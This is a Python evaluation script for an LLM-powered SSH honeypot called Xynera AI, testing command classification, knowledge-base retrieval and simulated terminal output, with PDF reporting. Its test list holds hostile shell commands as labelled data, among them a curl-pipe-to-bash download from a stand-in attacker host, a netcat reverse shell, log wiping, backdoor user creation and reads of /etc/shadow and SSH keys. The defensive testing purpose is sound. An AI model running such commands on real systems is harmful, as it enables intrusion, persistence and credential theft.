import sys
import os
import asyncio
import json
import re
import time
import httpx
from typing import List, Dict, Any

# Ensure we can import modules from xynera-ai
sys.path.append(os.path.dirname(os.path.abspath(__file__)))

from classifier import classify_command
import vector_store
from rag_engine import retrieve_context, generate_deception
import rag_engine
from knowledge_base import knowledge_documents

# PDF Generation Imports
from reportlab.lib import colors
from reportlab.lib.pagesizes import letter
from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle, PageBreak, KeepTogether
from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
from reportlab.lib.units import inch

# Initialize vector store
vector_store.init_vector_store()

# --- Monkeypatching Groq API with Retry Logic ---
original_call_groq_api = rag_engine.call_groq_api

async def call_groq_api_with_retry(prompt, max_tokens=1024):
    url = "https://api.groq.com/openai/v1/chat/completions"
    headers = {
        "Authorization": f"Bearer {rag_engine.GROQ_API_KEY}",
        "Content-Type": "application/json"
    }
    payload = {
        "model": rag_engine.GROQ_MODEL,
        "messages": [
            {
                "role": "user",
                "content": prompt
            }
        ],
        "max_tokens": max_tokens,
        "temperature": 0.1
    }
    
    retries = 6
    delay = 2.0
    
    for attempt in range(retries):
        try:
            async with httpx.AsyncClient(timeout=25.0) as client:
                response = await client.post(url, json=payload, headers=headers)
            
            if response.status_code == 200:
                result = response.json()
                return result["choices"][0]["message"]["content"].strip()
            
            elif response.status_code == 429:
                retry_after = 6.0
                try:
                    err_data = response.json()
                    msg = err_data.get("error", {}).get("message", "")
                    match = re.search(r"try again in ([0-9\.]+)s", msg)
                    if match:
                        retry_after = float(match.group(1)) + 1.0
                    elif "retry-after" in response.headers:
                        retry_after = float(response.headers["retry-after"]) + 1.0
                except:
                    pass
                print(f"      [Rate Limit 429] Limit reached. Sleeping for {retry_after:.2f}s before retry (Attempt {attempt+1}/{retries})...")
                await asyncio.sleep(retry_after)
            
            elif response.status_code in [500, 502, 503, 504]:
                print(f"      [Groq API Temp Error] Status {response.status_code}. Sleeping for {delay}s before retry...")
                await asyncio.sleep(delay)
                delay *= 2
            
            else:
                print(f"      [Groq API Error] Status code: {response.status_code}, Response: {response.text}")
                return None
                
        except Exception as e:
            print(f"      [Groq API Exception] {e}. Sleeping for {delay}s...")
            await asyncio.sleep(delay)
            delay *= 2
            
    return None

# Override the RAG engine API function dynamically
rag_engine.call_groq_api = call_groq_api_with_retry

# Define test cases
TEST_CASES = [
    # --- Reconnaissance ---
    {"command": "nmap -sS -v 192.168.1.1", "expected_class": "Reconnaissance", "expected_kb_command": "nmap", "adaptation_targets": ["192.168.1.1"]},
    {"command": "nmap -p 80,443 target.org", "expected_class": "Reconnaissance", "expected_kb_command": "nmap", "adaptation_targets": ["target.org", "80,443"]},
    
    # --- Malware Download Attempt ---
    {"command": "wget http://malware.sh/payload.sh", "expected_class": "Malware Download Attempt", "expected_kb_command": "wget", "adaptation_targets": ["malware.sh", "payload.sh"]},
    {"command": "curl -O http://malicious-site.net/miner.exe", "expected_class": "Malware Download Attempt", "expected_kb_command": "curl", "adaptation_targets": ["malicious-site.net", "miner.exe"]},
    {"command": "curl -s http://attacker.com/rev.sh | bash", "expected_class": "Malware Download Attempt", "expected_kb_command": "curl", "adaptation_targets": ["attacker.com", "rev.sh"]},

    # --- Permission Manipulation ---
    {"command": "chmod +x payload.sh", "expected_class": "Permission Manipulation", "expected_kb_command": "chmod", "adaptation_targets": ["payload.sh"]},
    {"command": "chmod 777 /var/www/html/uploads", "expected_class": "Permission Manipulation", "expected_kb_command": "chmod", "adaptation_targets": ["/var/www/html/uploads"]},

    # --- Reverse Shell Attempt ---
    {"command": "nc -lvp 4444", "expected_class": "Reverse Shell Attempt", "expected_kb_command": "nc", "adaptation_targets": ["4444"]},
    {"command": "netcat -e /bin/bash 10.0.0.5 8080", "expected_class": "Reverse Shell Attempt", "expected_kb_command": "netcat", "adaptation_targets": ["10.0.0.5", "8080"]},

    # --- SQL Injection Attempt ---
    {"command": "sqlmap -u \"http://site.com/index.php?id=1\" --dbs", "expected_class": "SQL Injection Attempt", "expected_kb_command": None, "adaptation_targets": []},

    # --- Defense Evasion ---
    {"command": "history -c", "expected_class": "Defense Evasion", "expected_kb_command": "history", "adaptation_targets": []},
    {"command": "rm -rf /var/log/nginx", "expected_class": "Defense Evasion", "expected_kb_command": None, "adaptation_targets": []},
    {"command": "stop auditd", "expected_class": "Defense Evasion", "expected_kb_command": None, "adaptation_targets": []},

    # --- Persistence Creation ---
    {"command": "echo \"ssh-rsa AAAAB...\" >> ~/.ssh/authorized_keys", "expected_class": "Persistence Creation", "expected_kb_command": None, "adaptation_targets": []},
    {"command": "useradd -m -g root backdoor", "expected_class": "Persistence Creation", "expected_kb_command": None, "adaptation_targets": ["backdoor"]},
    {"command": "crontab -e", "expected_class": "Persistence Creation", "expected_kb_command": "crontab", "adaptation_targets": []},

    # --- Privilege Escalation Attempt ---
    {"command": "find / -perm -4000 -type f 2>/dev/null", "expected_class": "Privilege Escalation Attempt", "expected_kb_command": "find", "adaptation_targets": []},
    {"command": "pkexec --version", "expected_class": "Privilege Escalation Attempt", "expected_kb_command": None, "adaptation_targets": []},
    {"command": "dirtycow", "expected_class": "Privilege Escalation Attempt", "expected_kb_command": None, "adaptation_targets": []},

    # --- Malware Execution Attempt ---
    {"command": "xmrig -o pool.mine.org", "expected_class": "Malware Execution Attempt", "expected_kb_command": None, "adaptation_targets": []},
    {"command": "minerd --url pool", "expected_class": "Malware Execution Attempt", "expected_kb_command": None, "adaptation_targets": []},
    {"command": "./tmp/miner", "expected_class": "Malware Execution Attempt", "expected_kb_command": None, "adaptation_targets": []},
    {"command": "base64 -d exploit.b64 > exploit", "expected_class": "Malware Execution Attempt", "expected_kb_command": None, "adaptation_targets": []},

    # --- Unknown / Benign ---
    {"command": "ps aux", "expected_class": "Unknown", "expected_kb_command": "ps", "adaptation_targets": []},
    {"command": "netstat -antp", "expected_class": "Unknown", "expected_kb_command": "netstat", "adaptation_targets": []},
    {"command": "ls -la /var/www", "expected_class": "Unknown", "expected_kb_command": "ls", "adaptation_targets": ["/var/www"]},
    {"command": "whoami", "expected_class": "Unknown", "expected_kb_command": "whoami", "adaptation_targets": []},
    {"command": "uname -a", "expected_class": "Unknown", "expected_kb_command": "uname", "adaptation_targets": []},
    {"command": "top -b -n 1", "expected_class": "Unknown", "expected_kb_command": "top", "adaptation_targets": []},
    {"command": "ip addr show", "expected_class": "Unknown", "expected_kb_command": "ip", "adaptation_targets": []},
    {"command": "ifconfig eth0", "expected_class": "Unknown", "expected_kb_command": "ifconfig", "adaptation_targets": ["eth0"]},
    {"command": "id", "expected_class": "Unknown", "expected_kb_command": "id", "adaptation_targets": []},
    {"command": "ss -tulpn", "expected_class": "Unknown", "expected_kb_command": "ss", "adaptation_targets": []},
    {"command": "df -h", "expected_class": "Unknown", "expected_kb_command": "df", "adaptation_targets": []},
    {"command": "free -m", "expected_class": "Unknown", "expected_kb_command": "free", "adaptation_targets": []},
    {"command": "ping -c 4 8.8.8.8", "expected_class": "Unknown", "expected_kb_command": "ping", "adaptation_targets": ["8.8.8.8"]},
    {"command": "uptime", "expected_class": "Unknown", "expected_kb_command": "uptime", "adaptation_targets": []},
    {"command": "systemctl status ssh", "expected_class": "Unknown", "expected_kb_command": "systemctl", "adaptation_targets": ["ssh"]},
    {"command": "env", "expected_class": "Unknown", "expected_kb_command": "env", "adaptation_targets": []},
    {"command": "lscpu", "expected_class": "Unknown", "expected_kb_command": "lscpu", "adaptation_targets": []},
    {"command": "grep -r \"password\" /var/www", "expected_class": "Unknown", "expected_kb_command": "grep", "adaptation_targets": ["/var/www"]},
    {"command": "w", "expected_class": "Unknown", "expected_kb_command": "w", "adaptation_targets": []},
    {"command": "last -n 5", "expected_class": "Unknown", "expected_kb_command": "last", "adaptation_targets": []},
    {"command": "iptables -L", "expected_class": "Unknown", "expected_kb_command": "iptables", "adaptation_targets": []},
    {"command": "hostname", "expected_class": "Unknown", "expected_kb_command": "hostname", "adaptation_targets": []},
    {"command": "dmesg | tail", "expected_class": "Unknown", "expected_kb_command": "dmesg", "adaptation_targets": []},
    {"command": "lsb_release -a", "expected_class": "Unknown", "expected_kb_command": "lsb_release", "adaptation_targets": []},
    {"command": "which python3", "expected_class": "Unknown", "expected_kb_command": "which", "adaptation_targets": []},
    {"command": "docker ps", "expected_class": "Unknown", "expected_kb_command": "docker", "adaptation_targets": []},
    
    # --- Decoy Files (Credentials, API keys, DB records, Configs) ---
    {"command": "cat /home/ubuntu/.ssh/id_rsa", "expected_class": "Unknown", "expected_kb_command": "cat /home/ubuntu/.ssh/id_rsa", "adaptation_targets": ["OPENSSH"]},
    {"command": "cat /home/ubuntu/.env", "expected_class": "Unknown", "expected_kb_command": "cat /home/ubuntu/.env", "adaptation_targets": ["DATABASE_URL"]},
    {"command": "cat /var/www/internal/db_backup.sql", "expected_class": "Unknown", "expected_kb_command": "cat /var/www/internal/db_backup.sql", "adaptation_targets": ["PostgreSQL"]},
    {"command": "cat /etc/shadow", "expected_class": "Unknown", "expected_kb_command": "cat /etc/shadow", "adaptation_targets": ["root"]},
    {"command": "cat /var/www/internal/dev_tasks.md", "expected_class": "Unknown", "expected_kb_command": "cat /var/www/internal/dev_tasks.md", "adaptation_targets": ["staging-api-01"]},
    {"command": "cat /etc/gateway/router.conf", "expected_class": "Unknown", "expected_kb_command": "cat /etc/gateway/router.conf", "adaptation_targets": ["staging-api-01"]},
    {"command": "cat /home/ubuntu/.ssh/backup_key", "expected_class": "Unknown", "expected_kb_command": "cat /home/ubuntu/.ssh/backup_key", "adaptation_targets": ["OPENSSH"]},
    {"command": "cat /home/dev/backup_status.txt", "expected_class": "Unknown", "expected_kb_command": "cat /home/dev/backup_status.txt", "adaptation_targets": ["Glacier"]},

    # --- Out of Scope / Benign Negative Cases ---
    {"command": "mkdir /tmp/test", "expected_class": "Malware Execution Attempt", "expected_kb_command": None, "adaptation_targets": []},
    {"command": "pwd", "expected_class": "Unknown", "expected_kb_command": None, "adaptation_targets": []},
    {"command": "date", "expected_class": "Unknown", "expected_kb_command": None, "adaptation_targets": []},
    {"command": "cat /etc/passwd", "expected_class": "Unknown", "expected_kb_command": None, "adaptation_targets": []},
]

SEMANTIC_RETRIEVAL_TESTS = [
    {"query": "who am i", "expected_kb_command": "whoami"},
    {"query": "network connections", "expected_kb_command": "netstat"},
    {"query": "disk space usage", "expected_kb_command": "df"},
    {"query": "check RAM usage", "expected_kb_command": "free"},
    {"query": "show running processes", "expected_kb_command": "ps"}
]

def calculate_metrics(y_true: List[str], y_pred: List[str]):
    classes = sorted(list(set(y_true) | set(y_pred)))
    
    overall_correct = sum(1 for t, p in zip(y_true, y_pred) if t == p)
    overall_accuracy = overall_correct / len(y_true) if y_true else 0.0
    
    class_metrics = {}
    for c in classes:
        tp = sum(1 for t, p in zip(y_true, y_pred) if t == c and p == c)
        fp = sum(1 for t, p in zip(y_true, y_pred) if t != c and p == c)
        fn = sum(1 for t, p in zip(y_true, y_pred) if t == c and p != c)
        
        precision = tp / (tp + fp) if (tp + fp) > 0 else 0.0
        recall = tp / (tp + fn) if (tp + fn) > 0 else 0.0
        f1 = (2 * precision * recall) / (precision + recall) if (precision + recall) > 0 else 0.0
        
        class_metrics[c] = {
            "tp": tp, "fp": fp, "fn": fn,
            "precision": precision, "recall": recall, "f1": f1
        }
        
    return overall_accuracy, class_metrics

def check_no_markdown_code_blocks(response: str) -> bool:
    return "```" not in response

def check_no_conversational_fluff(response: str) -> bool:
    res_lower = response.strip().lower()
    if not res_lower:
        return True
    
    lines = res_lower.split('\n')
    check_lines = lines[:2] + lines[-2:] if len(lines) > 4 else lines
    
    fluff_keywords = [
        "apolog", "sorry", "i cannot", "as an ai", "here is the", "note:", 
        "sure, here", "simulat", "terminal output", "command execution", "my apologies"
    ]
    for line in check_lines:
        if any(keyword in line for keyword in fluff_keywords):
            return False
    return True

def check_no_prompt_leakage(response: str) -> bool:
    res_stripped = response.strip()
    if not res_stripped:
        return True
    
    lines = res_stripped.split('\n')
    first_line = lines[0].strip()
    last_line = lines[-1].strip()
    
    prompt_regex = r'^[a-zA-Z0-9_-]+@[a-zA-Z0-9_-]+:.*?[#$]$'
    if re.match(prompt_regex, first_line) or re.match(prompt_regex, last_line):
        return False
        
    if last_line.endswith("$") or last_line.endswith("#"):
        if "@" in last_line or "ubuntu" in last_line or "root" in last_line:
            return False
            
    return True

def check_parameter_adaptation(response: str, targets: List[str]) -> bool:
    if not targets:
        return True
    return all(target.lower() in response.lower() for target in targets)

async def call_llm_as_judge(command: str, reference: str, response: str) -> Dict[str, Any]:
    prompt = f"""You are a strict QA evaluator testing an AI deception honeypot.
The AI is simulating a Linux Ubuntu terminal and must generate realistic stdout/stderr output for the command executed.

COMMAND EXECUTED:
{command}

REFERENCE DOCUMENT/EXAMPLE OUTPUT:
{reference}

GENERATED AI RESPONSE:
{response}

Evaluate the GENERATED AI RESPONSE on a scale of 1 to 10 for the following three metrics:

1. Realism (1-10): How realistic is the output? Does it look exactly like what a real Linux terminal would output for this command?
2. Adherence (1-10): Did the AI avoid any conversational fluff, notes, apologies, explanations, or wrapping the output in markdown code blocks (```)? (10 = perfect terminal output, 1 = contains explanations, code block tags, or apologies).
3. Consistency (1-10): Is the response logically consistent with the command executed, including any flags, arguments, IPs, or filenames?

Return your evaluation in raw JSON format with NO markdown wrapping, no extra keys, exactly like this:
{{
  "realism": <int>,
  "adherence": <int>,
  "consistency": <int>,
  "reasoning": "<short description of issues found or praise>"
}}
"""
    result_text = await call_groq_api_with_retry(prompt, max_tokens=256)
    if not result_text:
        return {"realism": 1, "adherence": 1, "consistency": 1, "reasoning": "Failed to call judge API."}
    
    try:
        cleaned_text = result_text.strip()
        if cleaned_text.startswith("```json"):
            cleaned_text = cleaned_text[7:]
        if cleaned_text.endswith("```"):
            cleaned_text = cleaned_text[:-3]
        cleaned_text = cleaned_text.strip()
        
        return json.loads(cleaned_text)
    except Exception as e:
        match = re.search(r'\{.*\}', result_text, re.DOTALL)
        if match:
            try:
                return json.loads(match.group(0))
            except:
                pass
        return {"realism": 1, "adherence": 1, "consistency": 1, "reasoning": f"Failed to parse JSON. Raw: {result_text}"}

def add_footer(canvas, doc):
    canvas.saveState()
    canvas.setFont('Helvetica', 8)
    canvas.setFillColor(colors.HexColor("#A0AEC0"))
    canvas.drawString(0.75 * inch, 0.4 * inch, f"Xynera AI Backend Evaluation Report | Page {doc.page}")
    canvas.drawRightString(letter[0] - 0.75 * inch, 0.4 * inch, time.strftime("%Y-%m-%d %H:%M:%S"))
    canvas.restoreState()

def generate_pdf_report(cls_accuracy, cls_metrics, classification_failures,
                        ret_accuracy, ret_metrics, retrieval_failures,
                        response_evals, commands_to_generate,
                        avg_latency, no_code_blocks_pct, no_fluff_pct, no_prompt_leakage_pct, adaptation_pct,
                        avg_realism, avg_adherence, avg_consistency,
                        filename="evaluation_report.pdf"):
    
    doc = SimpleDocTemplate(
        filename,
        pagesize=letter,
        leftMargin=0.5 * inch,
        rightMargin=0.5 * inch,
        topMargin=0.5 * inch,
        bottomMargin=0.6 * inch
    )
    
    styles = getSampleStyleSheet()
    title_style = ParagraphStyle(
        'DocTitle', parent=styles['Heading1'], fontName='Helvetica-Bold', fontSize=22, leading=26,
        textColor=colors.HexColor("#1A202C"), spaceAfter=4
    )
    subtitle_style = ParagraphStyle(
        'DocSubTitle', parent=styles['Normal'], fontName='Helvetica', fontSize=10, leading=14,
        textColor=colors.HexColor("#718096"), spaceAfter=12
    )
    h1_style = ParagraphStyle(
        'SecHeader', parent=styles['Heading2'], fontName='Helvetica-Bold', fontSize=13, leading=17,
        textColor=colors.HexColor("#2B6CB0"), spaceBefore=12, spaceAfter=6, keepWithNext=True
    )
    h2_style = ParagraphStyle(
        'SubSecHeader', parent=styles['Heading3'], fontName='Helvetica-Bold', fontSize=10, leading=13,
        textColor=colors.HexColor("#2D3748"), spaceBefore=8, spaceAfter=4, keepWithNext=True
    )
    body_style = ParagraphStyle(
        'BodyTextCustom', parent=styles['Normal'], fontName='Helvetica', fontSize=8.5, leading=12,
        textColor=colors.HexColor("#2D3748")
    )
    code_style = ParagraphStyle(
        'CodeText', parent=styles['Normal'], fontName='Courier', fontSize=7.5, leading=10,
        textColor=colors.HexColor("#C53030")
    )
    th_style = ParagraphStyle(
        'THeader', parent=styles['Normal'], fontName='Helvetica-Bold', fontSize=8, leading=10,
        textColor=colors.white
    )
    tb_style = ParagraphStyle(
        'TBody', parent=styles['Normal'], fontName='Helvetica', fontSize=8, leading=11,
        textColor=colors.HexColor("#2D3748")
    )
    
    story = []
    
    # Title
    story.append(Paragraph("Xynera AI Backend Evaluation Report", title_style))
    story.append(Paragraph(f"Generated on {time.strftime('%Y-%m-%d %H:%M:%S')} | Evaluation Run", subtitle_style))
    story.append(Spacer(1, 8))
    
    # Metadata / Executive Summary Table
    meta_data = [
        [Paragraph("Metadata", th_style), Paragraph("Value", th_style)],
        [Paragraph("Model Evaluated", tb_style), Paragraph("llama-3.1-8b-instant (via Groq)", tb_style)],
        [Paragraph("Classification Commands Tested", tb_style), Paragraph(str(len(TEST_CASES)), tb_style)],
        [Paragraph("Retrieval Test Queries Tested", tb_style), Paragraph(str(len(TEST_CASES) + len(SEMANTIC_RETRIEVAL_TESTS)), tb_style)],
        [Paragraph("Generation Cases Evaluated", tb_style), Paragraph(str(len(commands_to_generate)), tb_style)],
    ]
    t_meta = Table(meta_data, colWidths=[2.5*inch, 5.0*inch])
    t_meta.setStyle(TableStyle([
        ('BACKGROUND', (0,0), (-1,0), colors.HexColor("#4A5568")),
        ('GRID', (0,0), (-1,-1), 0.5, colors.HexColor("#CBD5E0")),
        ('TOPPADDING', (0,0), (-1,-1), 4),
        ('BOTTOMPADDING', (0,0), (-1,-1), 4),
    ]))
    story.append(t_meta)
    story.append(Spacer(1, 12))
    
    # Section 1: Summary Dashboard
    story.append(Paragraph("1. Summary Performance Dashboard", h1_style))
    story.append(Paragraph("Below is a summary of performance metrics across all evaluated aspects:", body_style))
    story.append(Spacer(1, 6))
    
    summary_data = [
        [Paragraph("Category", th_style), Paragraph("Metric Name", th_style), Paragraph("Value", th_style), Paragraph("Target/Description", th_style)],
        [Paragraph("Classification", tb_style), Paragraph("Threat Category Accuracy", tb_style), Paragraph(f"{cls_accuracy:.2%}", tb_style), Paragraph("100% target accuracy", tb_style)],
        [Paragraph("Retrieval", tb_style), Paragraph("KB Retrieval Accuracy", tb_style), Paragraph(f"{ret_accuracy:.2%}", tb_style), Paragraph(">85% retrieval match", tb_style)],
        [Paragraph("Response Quality", tb_style), Paragraph("Average Generation Latency", tb_style), Paragraph(f"{avg_latency:.2f}s", tb_style), Paragraph("LLM response latency", tb_style)],
        [Paragraph("Response Quality", tb_style), Paragraph("No Markdown Code Blocks", tb_style), Paragraph(f"{no_code_blocks_pct:.2%}", tb_style), Paragraph("100% raw output", tb_style)],
        [Paragraph("Response Quality", tb_style), Paragraph("No Conversational Fluff", tb_style), Paragraph(f"{no_fluff_pct:.2%}", tb_style), Paragraph("100% terminal outputs", tb_style)],
        [Paragraph("Response Quality", tb_style), Paragraph("No Prompt Leakage", tb_style), Paragraph(f"{no_prompt_leakage_pct:.2%}", tb_style), Paragraph("100% prompt-free", tb_style)],
        [Paragraph("Response Quality", tb_style), Paragraph("Parameter Adaptation", tb_style), Paragraph(f"{adaptation_pct:.2%}", tb_style), Paragraph("Adapt target IPs/filenames", tb_style)],
        [Paragraph("LLM-as-a-Judge", tb_style), Paragraph("Average Realism Rating", tb_style), Paragraph(f"{avg_realism:.2f} / 10", tb_style), Paragraph("Evaluator realism score", tb_style)],
        [Paragraph("LLM-as-a-Judge", tb_style), Paragraph("Average Adherence Rating", tb_style), Paragraph(f"{avg_adherence:.2f} / 10", tb_style), Paragraph("Evaluator formatting score", tb_style)],
        [Paragraph("LLM-as-a-Judge", tb_style), Paragraph("Average Consistency Rating", tb_style), Paragraph(f"{avg_consistency:.2f} / 10", tb_style), Paragraph("Evaluator consistency score", tb_style)],
    ]
    t_summary = Table(summary_data, colWidths=[1.3*inch, 2.2*inch, 1.0*inch, 3.0*inch])
    t_summary.setStyle(TableStyle([
        ('BACKGROUND', (0,0), (-1,0), colors.HexColor("#2B6CB0")),
        ('GRID', (0,0), (-1,-1), 0.5, colors.HexColor("#CBD5E0")),
        ('ROWBACKGROUNDS', (0,1), (-1,-1), [colors.HexColor("#F7FAFC"), colors.white]),
        ('TOPPADDING', (0,0), (-1,-1), 4),
        ('BOTTOMPADDING', (0,0), (-1,-1), 4),
    ]))
    story.append(t_summary)
    story.append(Spacer(1, 12))
    
    # Section 2: Classification Performance Details
    story.append(Paragraph("2. Classification Performance Details", h1_style))
    story.append(Paragraph("Class-wise precision, recall, and F1 metrics for the command classifier:", body_style))
    story.append(Spacer(1, 6))
    
    class_data = [[Paragraph("Attack Threat Class", th_style), Paragraph("Precision", th_style), Paragraph("Recall", th_style), Paragraph("F1-Score", th_style)]]
    for cls, m in cls_metrics.items():
        class_data.append([
            Paragraph(cls, tb_style),
            Paragraph(f"{m['precision']:.1%}", tb_style),
            Paragraph(f"{m['recall']:.1%}", tb_style),
            Paragraph(f"{m['f1']:.2f}", tb_style),
        ])
    t_class = Table(class_data, colWidths=[3.5*inch, 1.3*inch, 1.3*inch, 1.4*inch])
    t_class.setStyle(TableStyle([
        ('BACKGROUND', (0,0), (-1,0), colors.HexColor("#2C5282")),
        ('GRID', (0,0), (-1,-1), 0.5, colors.HexColor("#CBD5E0")),
        ('ROWBACKGROUNDS', (0,1), (-1,-1), [colors.HexColor("#F7FAFC"), colors.white]),
        ('TOPPADDING', (0,0), (-1,-1), 4),
        ('BOTTOMPADDING', (0,0), (-1,-1), 4),
    ]))
    story.append(t_class)
    
    story.append(Spacer(1, 8))
    story.append(Paragraph("Classification Errors & Misclassifications:", h2_style))
    if classification_failures:
        fail_data = [[Paragraph("Command Executed", th_style), Paragraph("Expected Class", th_style), Paragraph("Predicted Class", th_style)]]
        for f in classification_failures:
            fail_data.append([
                Paragraph(f['command'], code_style),
                Paragraph(f['expected'], tb_style),
                Paragraph(f['actual'], tb_style),
            ])
        t_fail = Table(fail_data, colWidths=[3.5*inch, 2.0*inch, 2.0*inch])
        t_fail.setStyle(TableStyle([
            ('BACKGROUND', (0,0), (-1,0), colors.HexColor("#9B2C2C")),
            ('GRID', (0,0), (-1,-1), 0.5, colors.HexColor("#CBD5E0")),
            ('TOPPADDING', (0,0), (-1,-1), 4),
            ('BOTTOMPADDING', (0,0), (-1,-1), 4),
        ]))
        story.append(t_fail)
    else:
        story.append(Paragraph("No classification failures recorded. Accuracy is 100%.", body_style))
        
    story.append(PageBreak())
    
    # Section 3: Retrieval Performance Details
    story.append(Paragraph("3. Retrieval Performance Details", h1_style))
    story.append(Paragraph("Evaluation of vector store retrieval matching expected KB articles or returning None for out-of-scope queries:", body_style))
    story.append(Spacer(1, 6))
    
    ret_data = [[Paragraph("Target KB Document", th_style), Paragraph("Precision", th_style), Paragraph("Recall", th_style), Paragraph("F1-Score", th_style)]]
    for doc_name, m in ret_metrics.items():
        ret_data.append([
            Paragraph(doc_name, tb_style),
            Paragraph(f"{m['precision']:.1%}", tb_style),
            Paragraph(f"{m['recall']:.1%}", tb_style),
            Paragraph(f"{m['f1']:.2f}", tb_style),
        ])
    t_ret = Table(ret_data, colWidths=[3.5*inch, 1.3*inch, 1.3*inch, 1.4*inch])
    t_ret.setStyle(TableStyle([
        ('BACKGROUND', (0,0), (-1,0), colors.HexColor("#2C5282")),
        ('GRID', (0,0), (-1,-1), 0.5, colors.HexColor("#CBD5E0")),
        ('ROWBACKGROUNDS', (0,1), (-1,-1), [colors.HexColor("#F7FAFC"), colors.white]),
        ('TOPPADDING', (0,0), (-1,-1), 4),
        ('BOTTOMPADDING', (0,0), (-1,-1), 4),
    ]))
    story.append(t_ret)
    
    story.append(Spacer(1, 8))
    story.append(Paragraph("Retrieval Errors & Failures:", h2_style))
    if retrieval_failures:
        rfail_data = [[Paragraph("Query / Command", th_style), Paragraph("Expected KB Doc", th_style), Paragraph("Actual Retrieved Doc", th_style)]]
        for f in retrieval_failures:
            rfail_data.append([
                Paragraph(f['query'], code_style),
                Paragraph(f['expected'], tb_style),
                Paragraph(f['actual'], tb_style),
            ])
        t_rfail = Table(rfail_data, colWidths=[3.5*inch, 2.0*inch, 2.0*inch])
        t_rfail.setStyle(TableStyle([
            ('BACKGROUND', (0,0), (-1,0), colors.HexColor("#9B2C2C")),
            ('GRID', (0,0), (-1,-1), 0.5, colors.HexColor("#CBD5E0")),
            ('TOPPADDING', (0,0), (-1,-1), 4),
            ('BOTTOMPADDING', (0,0), (-1,-1), 4),
        ]))
        story.append(t_rfail)
    else:
        story.append(Paragraph("No retrieval failures recorded. Accuracy is 100%.", body_style))
        
    story.append(Spacer(1, 12))
    
    # Section 4: Response Quality & Simulation Realism
    story.append(Paragraph("4. Response Quality & Simulation Realism Details", h1_style))
    story.append(Paragraph("Detail of responses generated, including syntactic rule checks and LLM-as-a-Judge scores:", body_style))
    story.append(Spacer(1, 6))
    
    resp_header = [
        Paragraph("Command", th_style),
        Paragraph("Lat.", th_style),
        Paragraph("Rules Check", th_style),
        Paragraph("Real.", th_style),
        Paragraph("Adh.", th_style),
        Paragraph("Cons.", th_style),
        Paragraph("Judge Feedback / Reasoning", th_style)
    ]
    resp_data = [resp_header]
    for r in response_evals:
        audits = r["audits"]
        judge = r["judge"]
        
        cb = "Blocks:✔" if audits["no_markdown_code_blocks"] else "Blocks:✘"
        fluff = "Fluff:✔" if audits["no_conversational_fluff"] else "Fluff:✘"
        pr = "Prompt:✔" if audits["no_prompt_leakage"] else "Prompt:✘"
        ad = "Adapt:✔" if audits["parameter_adaptation"] else "Adapt:✘"
        rules_text = f"{cb}<br/>{fluff}<br/>{pr}<br/>{ad}"
        
        resp_data.append([
            Paragraph(r['command'], code_style),
            Paragraph(f"{r['latency']:.1f}s", tb_style),
            Paragraph(rules_text, tb_style),
            Paragraph(str(judge.get('realism', 1)), tb_style),
            Paragraph(str(judge.get('adherence', 1)), tb_style),
            Paragraph(str(judge.get('consistency', 1)), tb_style),
            Paragraph(judge.get('reasoning', ''), tb_style),
        ])
        
    t_resp = Table(resp_data, colWidths=[1.8*inch, 0.4*inch, 1.2*inch, 0.4*inch, 0.4*inch, 0.4*inch, 2.9*inch])
    t_resp.setStyle(TableStyle([
        ('BACKGROUND', (0,0), (-1,0), colors.HexColor("#2B6CB0")),
        ('GRID', (0,0), (-1,-1), 0.5, colors.HexColor("#CBD5E0")),
        ('ROWBACKGROUNDS', (0,1), (-1,-1), [colors.HexColor("#F7FAFC"), colors.white]),
        ('TOPPADDING', (0,0), (-1,-1), 4),
        ('BOTTOMPADDING', (0,0), (-1,-1), 4),
        ('VALIGN', (0,0), (-1,-1), 'TOP'),
    ]))
    story.append(t_resp)
    
    # Build document
    doc.build(story, onFirstPage=add_footer, onLaterPages=add_footer)

async def run_evaluation():
    print("=== Starting Xynera AI Backend Evaluation ===")
    
    # 1. Classification Evaluation
    print("\n[1/3] Running Classification Evaluation...")
    class_true = []
    class_pred = []
    classification_failures = []
    
    for case in TEST_CASES:
        cmd = case["command"]
        exp_class = case["expected_class"]
        pred_class = classify_command(cmd)
        
        class_true.append(exp_class)
        class_pred.append(pred_class)
        
        if exp_class != pred_class:
            classification_failures.append({
                "command": cmd,
                "expected": exp_class,
                "actual": pred_class
            })
            
    cls_accuracy, cls_metrics = calculate_metrics(class_true, class_pred)
    print(f"      Classification Accuracy: {cls_accuracy:.2%}")
    
    # 2. Retrieval Evaluation
    print("\n[2/3] Running Retrieval Evaluation...")
    ret_true = []
    ret_pred = []
    retrieval_failures = []
    
    for case in TEST_CASES:
        cmd = case["command"]
        exp_kb = case["expected_kb_command"]
        
        doc = retrieve_context(cmd)
        pred_kb = doc["command"] if doc else None
        
        ret_true.append(exp_kb or "None")
        ret_pred.append(pred_kb or "None")
        
        if exp_kb != pred_kb:
            retrieval_failures.append({
                "query": cmd,
                "expected": exp_kb or "None",
                "actual": pred_kb or "None"
            })
            
    for case in SEMANTIC_RETRIEVAL_TESTS:
        query = case["query"]
        exp_kb = case["expected_kb_command"]
        
        doc = retrieve_context(query)
        pred_kb = doc["command"] if doc else None
        
        ret_true.append(exp_kb or "None")
        ret_pred.append(pred_kb or "None")
        
        if exp_kb != pred_kb:
            retrieval_failures.append({
                "query": query,
                "expected": exp_kb or "None",
                "actual": pred_kb or "None"
            })
            
    ret_accuracy, ret_metrics = calculate_metrics(ret_true, ret_pred)
    print(f"      Retrieval Accuracy: {ret_accuracy:.2%}")
    
    # 3. Response Quality Evaluation
    print("\n[3/3] Running Response Quality Evaluation (invoking LLM generation + judge)...")
    response_evals = []
    
    # Curated subset of 12 representative commands to generate & judge
    representative_commands = [
        "nmap -sS -v 192.168.1.1",
        "wget http://malware.sh/payload.sh",
        "chmod 777 /var/www/html/uploads",
        "nc -lvp 4444",
        "history -c",
        "crontab -e",
        "find / -perm -4000 -type f 2>/dev/null",
        "ps aux",
        "netstat -antp",
        "ping -c 4 8.8.8.8",
        "pwd",
        "mkdir /tmp/test",
        "cat /home/ubuntu/.ssh/id_rsa",
        "cat /home/ubuntu/.env"
    ]
    commands_to_generate = [case for case in TEST_CASES if case["command"] in representative_commands]
    
    total_gen = len(commands_to_generate)
    for idx, case in enumerate(commands_to_generate):
        cmd = case["command"]
        targets = case["adaptation_targets"]
        
        print(f"      [{idx+1}/{total_gen}] Processing command: {cmd}")
        
        start_time = time.time()
        response = await generate_deception(cmd)
        latency = time.time() - start_time
        
        pass_code_blocks = check_no_markdown_code_blocks(response)
        pass_fluff = check_no_conversational_fluff(response)
